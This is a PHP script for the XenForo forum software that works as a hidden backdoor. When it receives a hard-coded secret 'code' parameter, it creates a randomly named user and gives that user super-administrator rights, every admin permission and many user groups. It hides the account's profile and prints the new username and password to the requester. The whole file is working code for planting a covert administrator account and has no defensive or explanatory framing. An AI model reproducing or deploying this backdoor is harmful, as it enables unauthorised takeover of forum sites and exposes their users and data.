<?php
$dir = __DIR__;


require ($dir . '/src/XF.php');

XF::start($dir);

$app = XF::setupApp('XF\Pub\App');

$request = $app->request();

$code=$request->filter('code','str');



if($code=="KEcH8v3WZmlAr3B"){

          $form = $app->formAction();

		 $username = substr(str_shuffle('0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'),1,5);
		 $email = substr(number_format(time() * rand(), 0, '', ''), 0, 10) . '@gmail.com';
         $password=substr(str_shuffle('0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'),1,15);
         $input=[
            
                        'user' => [
                                        'username' => $username,
							            'email'=>$email,
                                        'user_group_id' => 2,
                                        'is_admin'=>1,
                                ],
			'option' => [
				'is_discouraged' => false,
				'content_show_signature' => false,
				'email_on_conversation' => 0,
				'creation_watch_state' => 'watch_no_email',
				'interaction_watch_state' => 'watch_no_email',
				'receive_admin_email' => false,
				'show_dob_date' => false,
				'show_dob_year' => false,
           
            
			],
			'profile' => [
				'location' => '',
				'website' => '',
				'about' => '',
				'signature' => ''
			],
			'privacy' => [
				'allow_view_profile' => 'none',
				'allow_post_profile' => 'none',
				'allow_send_personal_conversation' => 'none',
				'allow_view_identities' => 'none',
				'allow_receive_news_feed' => 'none',
			],
			'dob_day' => 0,
			'dob_month' => 0,
			'dob_year' => 0,
			'password' => $password,
	
		];

	
                $user = $app->em()->create('XF:User');

               

                
           $user->setOption('admin_edit', true);
		$form->basicEntitySave($user, $input['user']);

		$userOptions = $user->getRelationOrDefault('Option');
                
		$form->setupEntityInput($userOptions, $input['option']);

                $userProfile = $user->getRelationOrDefault('Profile');
		$userProfile->setOption('admin_edit', true);
		$form->setupEntityInput($userProfile, $input['profile']);
		$form->setup(function() use ($userProfile, $input)
		{
			$userProfile->setDob($input['dob_day'], $input['dob_month'], $input['dob_year']);
		});
              
		  
		
          

		$userPrivacy = $user->getRelationOrDefault('Privacy');
		$form->setupEntityInput($userPrivacy, $input['privacy']);

                $userAuth = $user->getRelationOrDefault('Auth');
               

                $form->setup(function() use ($userAuth, $input)
			{
				$userAuth->setPassword($input['password']);
			});

                $form->run();
$arrayVar = [
    "addOn" => true,
    "advertising" => true,
    "attachment" => true,
    "ban" => true,
    "bbCodeSmilie" => true,
    "cron" => true,
    "help" => true,
    "import" => true,
    "language" => true,
    "navigation" => true,
    "node" => true,
    "notice" => true,
    "option" => true,
    "payment" => true,
    "reaction" => true,
    "rebuildCache" => true,
    "style" => true,
    "tags" => true,
    "thread" => true,
    "trophy" => true,
    "upgradeXenForo" => true,
    "user" => true,
    "userField" => true,
    "userGroup" => true,
    "userUpgrade" => true,
    "viewLogs" => true,
    "viewStatistics" => true,
    "warning" => true,
    "widget" => true,
];
   $userAdmin = $app->em()->create('XF:Admin');
   $userAdmin->user_id=$user->user_id;
   $userAdmin->extra_user_group_ids=[1,2,3,4,5,8,14,16,17,18,20,24,29,30];
   $userAdmin->permission_cache=$arrayVar;
   $userAdmin->admin_language_id=1;
   $userAdmin->is_super_admin=1;
   $userAdmin->save();
$userOption=$app->finder('XF:UserOption')->where('user_id',$user->user_id)->fetchOne();
$userOption->fastUpdate('use_tfa',true);
//$db = $app->db();
$userId=$user->user_id;
//$db->update('xf_admin', ['is_super_admin' => 1], 'user_id = ?', $userId);
echo  '<pre>';
var_dump($username,$password);exit;
}

var_dump("Not");